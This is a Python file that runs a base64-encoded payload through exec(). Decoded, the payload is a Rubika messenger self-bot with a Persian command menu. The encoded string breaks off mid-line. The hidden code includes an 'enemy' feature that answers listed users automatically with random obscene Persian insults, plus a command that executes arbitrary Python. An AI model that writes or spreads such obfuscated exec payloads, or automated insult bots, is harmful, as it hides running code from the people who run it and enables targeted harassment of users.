import base64
exec(base64.b64decode("aW1wb3J0IGFzeW5jaW8KZnJvbSBydWJpa2EgaW1wb3J0IENsaWVudCwgbW9kZWxzLCBoYW5kbGVycyxtZXRob2RzCmZyb20gcmVxdWVzdHMgaW1wb3J0IGdldAppbXBvcnQganNvbgppbXBvcnQgcmUKaW1wb3J0IG9zLnBhdGgKaW1wb3J0IGxvZ2dpbmcKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyBjaAppbXBvcnQgc3lzCmltcG9ydCBpbywgdHJhY2ViYWNrCgpsb2dnaW5nLmJhc2ljQ29uZmlnKGxldmVsPWxvZ2dpbmcuRVJST1IpCgojIHsnYWYnOiAnYWZyaWthYW5zJywgJ3NxJzogJ2FsYmFuaWFuJywgJ2FtJzogJ2FtaGFyaWMnLCAnYXInOiAnYXJhYmljJywgJ2h5JzogJ2FybWVuaWFuJywgJ2F6JzogJ2F6ZXJiYWlqYW5pJywgJ2V1JzogJ2Jhc3F1ZScsICdiZSc6ICdiZWxhcnVzaWFuJywgJ2JuJzogJ2JlbmdhbGknLCAnYnMnOiAnYm9zbmlhbicsICdiZyc6ICdidWxnYXJpYW4nLCAnY2EnOiAnY2F0YWxhbicsICdjZWInOiAnY2VidWFubycsICdueSc6ICdjaGljaGV3YScsICd6aC1jbic6ICdjaGluZXNlIChzaW1wbGlmaWVkKScsICd6aC10dyc6ICdjaGluZXNlICh0cmFkaXRpb25hbCknLCAnY28nOiAnY29yc2ljYW4nLCAnaHInOiAnY3JvYXRpYW4nLCAnY3MnOiAnY3plY2gnLCAnZGEnOiAnZGFuaXNoJywgJ25sJzogJ2R1dGNoJywgJ2VuJzogJ2VuZ2xpc2gnLCAnZW8nOiAnZXNwZXJhbnRvJywgJ2V0JzogJ2VzdG9uaWFuJywgJ3RsJzogJ2ZpbGlwaW5vJywgJ2ZpJzogJ2Zpbm5pc2gnLCAnZnInOiAnZnJlbmNoJywgJ2Z5JzogJ2ZyaXNpYW4nLCAnZ2wnOiAnZ2FsaWNpYW4nLCAna2EnOiAnZ2VvcmdpYW4nLCAnZGUnOiAnZ2VybWFuJywgJ2VsJzogJ2dyZWVrJywgJ2d1JzogJ2d1amFyYXRpJywgJ2h0JzogJ2hhaXRpYW4gY3Jlb2xlJywgJ2hhJzogJ2hhdXNhJywgJ2hhdyc6ICdoYXdhaWlhbicsICdpdyc6ICdoZWJyZXcnLCAnaGUnOiAnaGVicmV3JywgJ2hpJzogJ2hpbmRpJywgJ2htbic6ICdobW9uZycsICdodSc6ICdodW5nYXJpYW4nLCAnaXMnOiAnaWNlbGFuZGljJywgJ2lnJzogJ2lnYm8nLCAnaWQnOiAnaW5kb25lc2lhbicsICdnYSc6ICdpcmlzaCcsICdpdCc6ICdpdGFsaWFuJywgJ2phJzogJ2phcGFuZXNlJywgJ2p3JzogJ2phdmFuZXNlJywgJ2tuJzogJ2thbm5hZGEnLCAna2snOiAna2F6YWtoJywgJ2ttJzogJ2tobWVyJywgJ2tvJzogJ2tvcmVhbicsICdrdSc6ICdrdXJkaXNoIChrdXJtYW5qaSknLCAna3knOiAna3lyZ3l6JywgJ2xvJzogJ2xhbycsICdsYSc6ICdsYXRpbicsICdsdic6ICdsYXR2aWFuJywgJ2x0JzogJ2xpdGh1YW5pYW4nLCAnbGInOiAnbHV4ZW1ib3VyZ2lzaCcsICdtayc6ICdtYWNlZG9uaWFuJywgJ21nJzogJ21hbGFnYXN5JywgJ21zJzogJ21hbGF5JywgJ21sJzogJ21hbGF5YWxhbScsICdtdCc6ICdtYWx0ZXNlJywgJ21pJzogJ21hb3JpJywgJ21yJzogJ21hcmF0aGknLCAnbW4nOiAnbW9uZ29saWFuJywgJ215JzogJ215YW5tYXIgKGJ1cm1lc2UpJywgJ25lJzogJ25lcGFsaScsICdubyc6ICdub3J3ZWdpYW4nLCAnb3InOiAnb2RpYScsICdwcyc6ICdwYXNodG8nLCAnZmEnOiAncGVyc2lhbicsICdwbCc6ICdwb2xpc2gnLCAncHQnOiAncG9ydHVndWVzZScsICdwYSc6ICdwdW5qYWJpJywgJ3JvJzogJ3JvbWFuaWFuJywgJ3J1JzogJ3J1c3NpYW4nLCAnc20nOiAnc2Ftb2FuJywgJ2dkJzogJ3Njb3RzIGdhZWxpYycsICdzcic6ICdzZXJiaWFuJywgJ3N0JzogJ3Nlc290aG8nLCAnc24nOiAnc2hvbmEnLCAnc2QnOiAnc2luZGhpJywgJ3NpJzogJ3NpbmhhbGEnLCAnc2snOiAnc2xvdmFrJywgJ3NsJzogJ3Nsb3ZlbmlhbicsICdzbyc6ICdzb21hbGknLCAnZXMnOiAnc3BhbmlzaCcsICdzdSc6ICdzdW5kYW5lc2UnLCAnc3cnOiAnc3dhaGlsaScsICdzdic6ICdzd2VkaXNoJywgJ3RnJzogJ3RhamlrJywgJ3RhJzogJ3RhbWlsJywgJ3RlJzogJ3RlbHVndScsICd0aCc6ICd0aGFpJywgJ3RyJzogJ3R1cmtpc2gnLCAndWsnOiAndWtyYWluaWFuJywgJ3VyJzogJ3VyZHUnLCAndWcnOiAndXlnaHVyJywgJ3V6JzogJ3V6YmVrJywgJ3ZpJzogJ3ZpZXRuYW1lc2UnLCAnY3knOiAnd2Vsc2gnLCAneGgnOiAneGhvc2EnLCAneWknOiAneWlkZGlzaCcsICd5byc6ICd5b3J1YmEnLCAnenUnOiAnenVsdSd9CiMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjCgpsb2NrICAgICA9IFtdCmRvbnRsb2NrID0gW10KZW5lbXkgICAgPSBbXQp3YW50ZWQgICA9IFtdCm11dGUgICAgID0gW10KZ2FtZSAgICAgPSBbXQpncm91ICAgICA9IFtdCnJ1biAgICAgID0gW10KCiMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjCgphc3luYyBkZWYgbWFpbigpOgogICAgYXN5bmMgd2l0aCBDbGllbnQoc2Vzc2lvbj0nc2VsZi1ib3QnKSBhcyBjbGllbnQ6CiAgICAgICAgQGNsaWVudC5vbihoYW5kbGVycy5NZXNzYWdlVXBkYXRlcygpKQogICAgICAgIGFzeW5jIGRlZiBzZWxmKGV2ZW50KToKICAgICAgICAgICAgI3ByaW50KGV2ZW50KQogICAgICAgICAgICB0ZXh0ID0gZXZlbnQucmF3X3RleHQKICAgICAgICAgICAgaWYgdGV4dCA9PSBOb25lOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVsc2U6IAogICAgICAgICAgICAgICAgb2JqZWN0cyA9IGV2ZW50Lm9iamVjdF9ndWlkCiAgICAgICAgICAgICAgICBndWlkID0gZXZlbnQuYXV0aG9yX2d1aWQKICAgICAgICAgICAgICAgIHJlcGx5ID0gZXZlbnQucmVwbHlfbWVzc2FnZV9pZAogICAgICAgICAgICAgICAgYWRtaW4gPSBhd2FpdCBjbGllbnQuZ2V0X21lKCkKICAgICAgICAgICAgICAgIGFkbWlucyA9IGFkbWluLnVzZXIudXNlcl9ndWlkCiAgICAgICAgICAgICAgICBtZXNzYWdlX2lkID0gZXZlbnQubWVzc2FnZS5tZXNzYWdlX2lkCgogICAgICAgICAgICAgICAgaWYgdGV4dD09ICIuaGVscCIgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgdXJsID0ganNvbi5sb2FkcyhnZXQoZiJodHRwOi8vYXBpLmNvZGViYXphbi5pci90aW1lLWRhdGUvP2pzb249ZW4iKS50ZXh0KQogICAgICAgICAgICAgICAgICAgICAgICB1cmwyID0gZ2V0KCJodHRwczovL2FwaS5jb2RlYmF6YW4uaXIvcGluZy8/dXJsPXd3dy5nb29nbGUuY29tIikudGV4dAogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShmIiIiCvCdmL7wnZme8J2ZpfCdmZ3wnZma8J2Zp/CdmZMt8J2YvfCdmYrwnZmPIHwge3VybFsncmVzdWx0J11bJ3RpbWUnXX0KCuKUnCDigKIg4oSN8J2VlvCdlZ3wnZWhIOKGrCAoLmhlbHApIC0+INiv2LPYqtmI2LHYp9iqCuKUnCDigKIg8J2VhPCdlaDwnZWV8J2VliDihqwgKC5tb2RlKSAtPiDZhdmI2K8g2YfYpwrilJwg4oCiIPCdlYvwnZWg8J2VoPCdlZ3wnZWkIOKGrCAoLnRvb2xzKSAtPiDYp9io2LLYp9ixINmH2KcK4pScIOKAoiDwnZS88J2Vn/CdlZbwnZWe8J2VqiDihqwgKC5lbmVteSkgLT4g2K3Yp9mE2Kog2K/YtNmF2YYKCgogICAg4bS54bWeIOG0teG0sCBAe2FkbWluLnVzZXIudXNlcm5hbWV9CgogICAg8J2Rg/CdkLzwnZGB8J2QuiDihqwge3VybDJ9IPCdmJTwnZi0CiAgICAgICAgICAgICAgICAgICAgICAgICIiIikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIHRleHQgPT0gIi5tb2RlIiBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseSgiIiIK4oCiIPCdmYjwnZmk8J2ZmfCdmZog8J2ZiPCdmZrwnZmj8J2ZqiDigKIKCuKGrCAudGltZSAgIPCdlaDwnZWfIC0g8J2VoPCdlZfwnZWXIC0+ICDYrdin2YTYqiDZhdmI2K8g2KrYp9uM2YUK4oasIC50YWcgICAg8J2VoPCdlZ8gLSDwnZWg8J2Vl/CdlZcgLT4gINit2KfZhNiqINmH2LTYqtqvCuKGrCAuZW1vamUgIPCdlaDwnZWfIC0g8J2VoPCdlZfwnZWXIC0+ICDYrdin2YTYqiDYp9uM2YXZiNis24wK4oasIC5lbXNldCAg8J2VoPCdlZ8gLSDwnZWg8J2Vl/CdlZcgLT4gINiz2Kog2KfbjNmF2YjYrNuMCuKGrCAubG9jayAgIPCdlaDwnZWfIC0g8J2VoPCdlZfwnZWXIC0+ICDYrdin2YTYqiDZgtmB2YQg2b7bjCDZiNuMIArihqwgLmNvcHkgICDwnZWg8J2VnyAtIPCdlaDwnZWX8J2VlyAtPiAg2K3Yp9mE2Kog2YXYqtmGINqp2b7bjArihqwgLnNlZW4gICDwnZWg8J2VnyAtIPCdlaDwnZWX8J2VlyAtPiAg2K3Yp9mE2Kog2LPbjNmGINiu2YjYr9qp2KfYsQrihqwgLnRleHQxICDwnZWg8J2VnyAtIPCdlaDwnZWX8J2VlyAtPiDYqtqp2LPYqiDZhdmI2K8gIDEK4oasIC5ncm91cCAg8J2VoPCdlZ8gLSDwnZWg8J2Vl/CdlZcgLT4g2YXYr9ix24zYqiDar9ix2YjZhyAK4oasIC50ZXh0MiAg8J2VoPCdlZ8gLSDwnZWg8J2Vl/CdlZcgLT4g2Kraqdiz2Kog2YXZiNivICAyCuKGrCAuaHlwZXIgIPCdlaDwnZWfIC0g8J2VoPCdlZfwnZWXIC0+ICDYrdin2YTYqiDZh9in24zZvtixCuKGrCAuVHlwaW5nIPCdlaDwnZWfIC0g8J2VoPCdlZfwnZWXIC0+ICDYrdin2YTYqiDYqtin24zZviDYrtmI2K/aqdin2LEK4oasIC5nYW1lICAg8J2VoPCdlZ8gLSDwnZWg8J2Vl/CdlZcgLT4g2KjYp9iy24wg2Kwg2K0gCuKGrCAuZ2FkICAgIPCdlaDwnZWfIC0g8J2VoPCdlZfwnZWXIC0+INin2YHYstmI2K/ZhiDYqNmHINio2KfYstuMCuKGrCAucm0gICAgIPCdlaDwnZWfIC0g8J2VoPCdlZfwnZWXIC0+INit2LDZgSDYqNin2LLbjNqp2YYg2KfYsiDYqNin2LLbjCAKCj09PT09PT09PT09PT0KCtiv2LPYqtmI2LHYp9iqINiz2LHar9ix2YXbjCDYr9ixINqv2LHZiNmHIDoKCjEgLSDaqduMINiu2LHZhwoKMiAtINqp24wg2qnZiNmG24zZhwoKMyAtINqp24wg2LHZhCDZhduM2LLZhtmHCgo0IC0g2qnbjCDYqNinINqp24wg2LHZhCDZhduM2LLZhtmHCgo1IC0g2qnbjCDaqduM2Ygg2YXbjNqp2YbZhwoKPT09PT09PT09PT09PT0KCtmG2qnYqtmHOgrYqNix2KfbjCDZgtin2LfbjCDZhti02K/ZhiDZhdmI2K8g2YfYpyDZgtio2YQg2LHZiNi02YYg2qnYsdiv2YYg2YXZiNivINis2K/bjNivINmF2YjYryDZgtio2YTbjCDYsdmIINiu2KfZhdmI2LQg2qnZhtuM2K8gLgoKCtmG2qnYqtmHOuKAjArYqNix2KfbjCDYqNin2LLbjCDaqdix2K/ZhiDYqNi52K8g2KfYsiDYsdmI2LTZhiDaqdix2K/ZhiDYqNin2LLbjCDZiCDYp9mB2LLZiNiv2YYg2b7ZhNuM2LEg2YfYp9uMINio2LHYp9uMINm+2LHYs9i0INqp2YTZhdmHICgg2KjZvtix2LMgKSDYp9iz2KrZgdin2K/ZhyDaqdmG24zYryAuCgoK2KjYsdin24wg2KfYr9uM2Kog2qnZhNmF2KfYqiDZgdin24zZhCAKCmdhbWUudHh0INix2Ygg2KfYr9uM2Kog2KjYstmG24zYrwoKCj09PT09PT09PT09PT09CgrYr9iz2KrZiNix2KfYqiDYr9in2K7ZhCDar9ix2YjZhyA6CgoKMSAtINin2K7Yt9in2LEgW9iv2YTbjNmEXQoKMiAtINit2LDZgSDYp9iu2LfYp9ixCgozIC0gLmluZm8gLT4g2KfYt9mE2KfYudin2Kog2q/YsdmI2YcKCjQgLSAuZ2V0bGluayAtPiDYr9ix24zYp9mB2Kog2YTbjNmG2qkg2q/YsdmI2YcKCj09PT09PT09PT09PT09CgrYr9iz2KrZiNix2KfYqiBMT0NLIFBWIDogCgrYqNix2KfbjCDYp9uM2YbaqdmHINqp2LPbjCDYqNiq2YjZhtmHINio2KfZh9in2KrZiNmGINqG2Kog2qnZhtmHINmI2YLYqtuMINit2KfZhNiqINmC2YHZhCDYsdmI2LTZhtmHINin2LIg2K/Ys9iq2YjYsSAKCj4gVW5sb2NrIAoK2KfYs9iq2YHYp9iv2Ycg2qnZhtuM2K8g2K/Yp9iu2YQg2b7bjCDZiNuMINi02K7YtSDYp9uM2YYg2K/Ys9iq2YjYsSDYsdmIINin2LHYs9in2YQg2qnZhtuM2K8KCgrZiCDYqNix2LnaqdizINin2q/ZhyDZhduM2K7ZiNin24zZhiDaqdiz24wg2YbYqtmI2YbZhyDYr9uM2q/ZhyDZvtuM2KfZhSDYqNiv2Ycg2KfYsiDYr9iz2KrZiNixIAoKPiBMb2NrIAoK2KfYs9iq2YHYp9iv2Ycg2qnZhtuM2K8g2K/Yp9iu2YQg2b7bjCDZiNuMINi32LHZgQoKICAgICAgICAgICAgICAgICAgICAgICAiIiIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiB0ZXh0ID09ICIudG9vbHMiIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KCIiIgrigKIg8J2Zj/CdmaTwnZmk8J2ZofCdmagg8J2ZiPCdmZrwnZmj8J2ZqiDigKIKCuKGrCAuZm9udArihqwgLnBpbmcK4oasIC5iaW8K4oasIC5jYXJkCuKGrCAuZGF0ZSAK4oasIC5qb2sgCuKGrCAucGluCuKGrCAudXBpbgrihqwgLnNldCAK4oasIC5saXN0IArihqwgLmNsZWFyCuKGrCAubG9jayAK4oasIC5mb3IgICB8IHJlcGx5CuKGrCAucHkgICAgfCBDb2RlIFB5dGhvbgrihqwgLnJtdXRlIHwgcmVwbHkgCuKGrCAuZG11dGUgfCByZXBseSAK4oasIC5yZW5lbXl8IHJlcGx5CuKGrCAucmRlbCAgfCByZXBseQoKPT09PT09PT09PT09PT09PT0KCjEgLSAuZm9udCBbVEVYVF0KCjIgLSAucGluZyBbU0lURV0gZ29vZ2xlLmNvbQoKMyAtIC5iaW8gPiBCaW8gUmFuZG9tCgo0IC0gLmNhcmQgW05VTUJFUl0KCjUgLSAuZGF0YSA+IFRpbWUgYW5kIERhdGEKCjYgLSAuam9rID4gSk9LIFJhbmRvbQoKNyAtIC5waW4gW1JFUExZXQoKOCAtIC51bnBpbiBbUkVQTFldCgo5IC0gc2V0ID4gU0VUIEdyb3VwIAoKMTAgLSAubGlzdCA+IExsaXN0IE9uIE1vZGUgCgoxMSAtIC5jbGVhciA+IENsZWFyIEFsbCBNb2RlIE9uIC0gT2ZmCgoxMiAtIGxvY2sgW09OIC0gT0ZGXQoKMTMgLSAuZm9yIFtSRVBMWV0gPiBGb3J3YXJkZWQgWW91ciBQb3N0CgoxNCAtIC5weSBbQ09ERSBweXRob24gUnVuXQoKMTUgLSAucm11dGUgPiBNdXRlIEdyb3VwIGlzIEBVU0VSTkFNRQoKMTYgLSAuZG11dGUgPiB1bk11dGUgR3JvdXAgaXMgQFVTRVJOQU1FCgoxNyAtIC5yZW5lbXkgPiBTZXQgKEVuZW15KSBpcyBbUkVQTFldCgoxOCAtIC5yZGVsID4gdW5TZXQgKEVuZW15KSBpcyBbUkVQTFldCiAgICAgICAgICAgICAgICAgICAgICAgICIiIikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIHRleHQgPT0gIi5lbmVteSIgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoIiIiCuKAoiDwnZmA8J2Zo/CdmZrwnZmi8J2ZriDwnZmI8J2ZmvCdmaPwnZmqIOKAogoK4oasIC5zZW5lbXkgLT4g2KfZgdiy2YjYr9mGINio2Ycg2KfZhtmF24wg2KjYpyDYp9uM2K/bjArihqwgLnJlbmVteSAtPiDYp9mB2LLZiNiv2YYg2KjZhyDYp9mG2YXbjCDYqNinINix24zZvtmE24wK4oasIC5yZGVsIC0+INit2LDZgSDYp9mG2YXbjCDYqNinINix24zZvtmE24wK4oasIC5tdXRlIC0+INmF24zZiNiqINio2Kcg2KfbjNiv24wgCuKGrCAuZGVsZW5lbXkgLT4g2K3YsNmBINin2YbZhduMINio2Kcg2KfbjNiv24wK4oasIC5kZWxtdXRlIC0+INit2LDZgSDZhduM2YjYqiDYqNinINin24zYr9uMICAKICAgICAgICAgICAgICAgICAgICAgICAgIiIiKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICMgICAgICAgICAgICAgICBbICBFTkVNWSAgXSAgICAgICAgICAgICAgICAgIwoKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgiLnNlbmVteSIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGV4dC5yZXBsYWNlKCIuc2VuZW15IiwiIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgaWRzID0gY29tbWFuZC5yZXBsYWNlKCJAIiwiIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICAgICB1cyA9IGF3YWl0IGNsaWVudChtZXRob2RzLmV4dHJhcy5HZXRPYmplY3RCeVVzZXJuYW1lKGlkcykpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZW15LmFwcGVuZCh1cy51c2VyLnVzZXJfZ3VpZCkKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoZiLwnZmO8J2ZmvCdmY8g8J2ZgPCdmZrwnZmj8J2ZmvCdmaLwnZmuXG57Y29tbWFuZH0iKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgaWYgZ3VpZCBpbiBlbmVteToKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIEZPU0ggPSBbJ9qp2LMg2YbYp9mF2YjYs9iqJywn2qnYsyDYrtin2YbYr9in2YbYqicsJ9qp2LMg2YbZhtiqJywn2KfZhNmH24wg2YXYp9iv2LEg2KzZhtiv2Ycg2LHZiCcsJ9qp24zYsdmFINiqINqp2LMg2YXYp9iv2LHYqicsJ9io2K/ZiCDZhtmG2KrZiCDYrNmF2Lkg2qnZhiDYrtin2LHaqdiz2YcnLCfaqduM2LHZhSDYqiDYp9mI2YTZiCDYp9iu2LHYqicsJ9iy2YbYp9iy2KfYr9mHJywn2qnbjNix2YXbjCDYrtin2LHaqdiz2YcnLCfYqNiz24zaqSDZhtmG2Ycg2KfZiNio2YbbjCcsJ9qp2LMg2YXYp9iv2LHYqtmIINmF2YjYsdivINi52YbYp9uM2Kog2YLYsdin2LEg2K/Yp9iv2YUnLCfYrtin2LHYrNmG2K/ZhyDYrdix2YjZhSDYrtmI2LEnLCfaqduM2LEg2KjYsdmHINiqINqp2LMg2YXYp9iv2LHYqicsJ9iu2KfYsSDaqdmI2YbbjCcsJ9mF2KfYr9ixINmB2KfYrdi02YcnLCfYrtin2LHYrNmG2K/ZhyDbjCDaqduM2LEg2K/YstivJywn2YbZhtmHINqp24zYsSDZvtix2LPYqicsJ9qp2LMg2YXYp9iv2LHYqtmIINqv2KfbjNuM2K/ZhSDYqNiz24zaqScsJ9iu2KfYsdis2YbYr9mHINmI2KfZgiDZiNin2YIg2YbaqdmGJ10KICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoY2goRk9TSCkpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5kZWxlbmVteSIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGV4dC5yZXBsYWNlKCIuZGVsZW5lbXkiLCIiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBpZHMgPSBjb21tYW5kLnJlcGxhY2UoIkAiLCIiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgIHVzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMuZXh0cmFzLkdldE9iamVjdEJ5VXNlcm5hbWUoaWRzKSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5lbXkucmVtb3ZlKHVzLnVzZXIudXNlcl9ndWlkKQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShmIvCdmYDwnZmj8J2ZmvCdmaLwnZmuIPCdmL/wnZma8J2ZofCdmZrwnZmP8J2ZmvCdmL9cbntjb21tYW5kfSIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShmIvCdmZDwnZmo8J2ZmvCdmafwnZmj8J2ZlvCdmaLwnZmaIPCdmYnwnZmk8J2ZqSDwnZmB8J2ZnvCdmaPwnZmZXG57Y29tbWFuZH0iKQogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKCIucmVuZW15IikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgaWRzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMubWVzc2FnZXMuR2V0TWVzc2FnZXNCeUlEKG9iamVjdHMsbWVzc2FnZV9pZHM9cmVwbHkpKQogICAgICAgICAgICAgICAgICAgICAgICB1cyA9IGF3YWl0IGNsaWVudChtZXRob2RzLnVzZXJzLkdldFVzZXJJbmZvKGlkcy5hdXRob3Jfb2JqZWN0X2d1aWQpKQogICAgICAgICAgICAgICAgICAgICAgICBlbmVteS5hcHBlbmQodXMudXNlci51c2VyX2d1aWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYi8J2ZjvCdmZrwnZmPIPCdmYDwnZma8J2Zo/CdmZrwnZmi8J2ZrlxuQHt1cy51c2VyLnVzZXJuYW1lfSIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5yZGVsIikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgaWRzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMubWVzc2FnZXMuR2V0TWVzc2FnZXNCeUlEKG9iamVjdHMsbWVzc2FnZV9pZHM9cmVwbHkpKQogICAgICAgICAgICAgICAgICAgICAgICB1cyA9IGF3YWl0IGNsaWVudChtZXRob2RzLnVzZXJzLkdldFVzZXJJbmZvKGlkcy5hdXRob3Jfb2JqZWN0X2d1aWQpKQogICAgICAgICAgICAgICAgICAgICAgICBlbmVteS5yZW1vdmUodXMudXNlci51c2VyX2d1aWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYi8J2ZgPCdmaPwnZma8J2ZovCdma4g8J2Yv/CdmZrwnZmh8J2ZmvCdmY/wnZma8J2Yv1xuQHt1cy51c2VyLnVzZXJuYW1lfSIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShmIvCdmZDwnZmo8J2ZmvCdmafwnZmj8J2ZlvCdmaLwnZmaIPCdmYnwnZmk8J2ZqSDwnZmB8J2ZnvCdmaPwnZmZXG5Ae3VzLnVzZXIudXNlcm5hbWV9IikKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgIyAgICAgICBbIE1PREUgXSAgICAgIwoKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKCJNb2RlL0JvbGQiKToKICAgICAgICAgICAgICAgICAgICBtb2RlID0gb3BlbigiTW9kZS9Cb2xkIikucmVhZCgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIG1vZGUgPSAib2ZmIgogICAgICAgICAgICAgICAgaWYgbW9kZSA9PSAib24iOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZWRpdChmIioqe3RleHR9KioiKSAjIEJPTEQgTU9ERQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKCIuYm9sZCIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGV4dC5yZXBsYWNlKCIuYm9sZCIsIiIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBpZiBjb21tYW5kID09ICJvbiIgb3IgIm9mZiI6CiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oIk1vZGUvQm9sZCIsInciKS53cml0ZShjb21tYW5kKQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KGYiKipCT0xEKiog8J2ZiPCdmaTwnZmZ8J2ZmiB7Y29tbWFuZH0iKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygiTW9kZS9IeXBlciIpOgogICAgICAgICAgICAgICAgICAgIG1vZGUgPSBvcGVuKCJNb2RlL0h5cGVyIikucmVhZCgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIG1vZGUgPSAib2ZmIgogICAgICAgICAgICAgICAgaWYgbW9kZSA9PSAib24iOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZXZlbnQudHlwZSA9PSAiR3JvdXAiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZXZlbnQubWVzc2FnZS5yZXBseV90b19tZXNzYWdlX2lkOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMubWVzc2FnZXMuR2V0TWVzc2FnZXNCeUlEKG9iamVjdHMsbWVzc2FnZV9pZHM9ZXZlbnQubWVzc2FnZS5yZXBseV90b19tZXNzYWdlX2lkKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KGYiW3t0ZXh0fV0oe3VzLm1lc3NhZ2VzWzBdLmF1dGhvcl9vYmplY3RfZ3VpZH0pIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZWRpdChmIlt7dGV4dH1dKHtndWlkfSkiKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKCIuaHlwZXIiKSBhbmQgZXZlbnQudHlwZSA9PSAiR3JvdXAiIGFuZCBndWlkID09IGFkbWlu